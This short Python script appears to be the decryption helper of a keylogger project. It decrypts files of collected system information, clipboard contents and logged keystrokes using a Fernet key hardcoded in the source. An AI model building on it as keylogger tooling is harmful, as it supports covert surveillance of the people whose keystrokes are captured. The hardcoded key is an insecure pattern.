from cryptography.fernet import Fernet
 

key = "sormMSLzddCDb40zEQ-E8wiIiWPqX_Dwcfvdijxz7EY="

system_information_e = "e_system.txt"

clipboard_information_e ="e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"


encrypted_file =[system_information_e, clipboard_information_e,keys_information_e]

count=0 

for decrypting_file in encrypted_file:

    with open(encrypted_file[count], 'rb') as f:
        data = f.read()
    fernet= Fernet(key)
    decrypted= fernet.decrypt(data)

    with open(encrypted_file[count],'wb') as f:
        f.write (decrypted)

    count+=1